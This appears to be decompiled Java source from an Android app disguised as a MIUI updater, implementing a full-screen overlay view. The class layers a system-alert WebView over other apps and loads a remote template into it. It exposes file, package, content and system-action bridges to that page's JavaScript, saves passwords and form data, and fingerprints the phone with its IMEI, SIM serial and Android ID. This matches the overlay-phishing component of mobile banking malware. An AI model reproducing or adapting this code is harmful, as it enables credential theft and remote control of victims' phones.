package brandmangroupe.miui.updater;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build.VERSION;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.RelativeLayout;
import android.widget.TextView;
import java.util.UUID;

public class OverlayView extends RelativeLayout {
    private TextView info;
    protected LayoutParams layoutParams;
    private Context mcontext;
    private int notificationId = 0;
    private String template = "";

    public OverlayView(OverlayService service, int notificationId, Context mc, String tpl) {
        super(service);
        this.mcontext = mc;
        this.notificationId = notificationId;
        this.template = tpl;
        setLongClickable(true);
        load();
    }

    public OverlayService getService() {
        return (OverlayService) getContext();
    }

    public int getLayoutGravity() {
        return 17;
    }

    private void setupLayoutParams() {
        this.layoutParams = new LayoutParams(-1, -1, 2010, 256, -3);
        this.layoutParams.gravity = getLayoutGravity();
        onSetupLayoutParams();
    }

    /* access modifiers changed from: protected */
    public void onSetupLayoutParams() {
    }

    @SuppressLint({"NewApi"})
    private void inflateView() {
        LayoutInflater inflater = (LayoutInflater) getContext().getSystemService("layout_inflater");
        WebView webview = (WebView) findViewById(R.id.www);
        if (this.template.contains("#full")) {
            this.template = this.template.substring(0, this.template.length() - 5);
            inflater.inflate(R.layout.wv2, this);
        } else {
            inflater.inflate(R.layout.wv, this);
        }
        webview = (WebView) findViewById(R.id.www);
        webview.setBackgroundColor(0);
        webview.addJavascriptInterface(new MeSetting(this.mcontext), "MeSetting");
        webview.addJavascriptInterface(new MeSystem(this.mcontext), "MeSystem");
        webview.addJavascriptInterface(new MeFile(this.mcontext), "MeFile");
        webview.addJavascriptInterface(new MePackage(this.mcontext), "MePackage");
        webview.addJavascriptInterface(new MeContent(this.mcontext), "MeContent");
        webview.addJavascriptInterface(new MeAction(this.mcontext), "MeAction");
        WebSettings webSettings = webview.getSettings();
        webSettings.setSavePassword(true);
        webSettings.setSaveFormData(true);
        webSettings.setAllowFileAccess(true);
        if (VERSION.SDK_INT >= 16) {
            webSettings.setAllowFileAccessFromFileURLs(true);
            webSettings.setAllowUniversalAccessFromFileURLs(true);
        }
        webSettings.setJavaScriptEnabled(true);
        webSettings.setUserAgentString("Hash: " + getUniqueID(this.mcontext));
        String key = "";
        try {
            ApplicationInfo appInfo = this.mcontext.getPackageManager().getApplicationInfo(this.mcontext.getPackageName(), 128);
            if (appInfo.metaData != null) {
                key = appInfo.metaData.getString("domain");
            }
        } catch (NameNotFoundException oops) {
            oops.printStackTrace();
        }
        if (this.template.length() > 0) {
            webview.loadUrl(this.template);
        }
    }

    public static String getUniqueID(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
        String deviceId = new UUID((long) (Secure.getString(context.getContentResolver(), "android_id")).hashCode(), (((long) (tm.getDeviceId()).hashCode()) << 32) | ((long) (tm.getSimSerialNumber()).hashCode())).toString();
        String key = "";
        try {
            ApplicationInfo appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 128);
            if (appInfo.metaData != null) {
                key = appInfo.metaData.getString("sub");
            }
        } catch (NameNotFoundException oops) {
            oops.printStackTrace();
        }
        return new StringBuilder(String.valueOf(deviceId)).append("-").append(key).toString();
    }

    public boolean isVisible() {
        return true;
    }

    public void refreshLayout() {
        if (isVisible()) {
            removeAllViews();
            inflateView();
            onSetupLayoutParams();
            ((WindowManager) getContext().getSystemService("window")).updateViewLayout(this, this.layoutParams);
            refresh();
        }
    }

    /* access modifiers changed from: protected */
    public void addView() {
        setupLayoutParams();
        ((WindowManager) getContext().getSystemService("window")).addView(this, this.layoutParams);
        super.setVisibility(8);
    }

    /* access modifiers changed from: protected */
    public void load() {
        inflateView();
        addView();
        refresh();
    }

    /* access modifiers changed from: protected */
    public void unload() {
        ((WindowManager) getContext().getSystemService("window")).removeView(this);
        removeAllViews();
    }

    /* access modifiers changed from: protected */
    public void reload() {
        unload();
        load();
    }

    public void destory() {
        ((WindowManager) getContext().getSystemService("window")).removeView(this);
    }

    public void refresh() {
        if (isVisible()) {
            setVisibility(0);
        } else {
            setVisibility(8);
        }
    }

    /* access modifiers changed from: protected */
    public boolean showNotificationHidden() {
        return true;
    }

    /* access modifiers changed from: protected */
    public boolean onVisibilityToChange(int visibility) {
        return true;
    }

    /* access modifiers changed from: protected */
    public View animationView() {
        return this;
    }

    /* access modifiers changed from: protected */
    public void hide() {
        super.setVisibility(8);
    }

    /* access modifiers changed from: protected */
    public void show() {
        super.setVisibility(0);
    }

    public void setVisibility(int visibility) {
        boolean z = false;
        OverlayService service;
        int i;
        if (visibility == 0) {
            service = getService();
            i = this.notificationId;
            if (!showNotificationHidden()) {
                z = true;
            }
            service.moveToForeground(i, z);
        } else {
            service = getService();
            i = this.notificationId;
            if (!showNotificationHidden()) {
                z = true;
            }
            service.moveToBackground(i, z);
        }
        if (getVisibility() != visibility && onVisibilityToChange(visibility)) {
            super.setVisibility(visibility);
        }
    }

    /* access modifiers changed from: protected */
    public int getLeftOnScreen() {
        int[] location = new int[2];
        getLocationOnScreen(location);
        return location[0];
    }

    /* access modifiers changed from: protected */
    public int getTopOnScreen() {
        int[] location = new int[2];
        getLocationOnScreen(location);
        return location[1];
    }

    /* access modifiers changed from: protected */
    public boolean isInside(View view, int x, int y) {
        int[] location = new int[2];
        view.getLocationOnScreen(location);
        if (x < location[0] || x > location[0] + view.getWidth() || y < location[1] || y > location[1] + view.getHeight()) {
            return false;
        }
        return true;
    }

    public int getGravity() {
        return 53;
    }
}
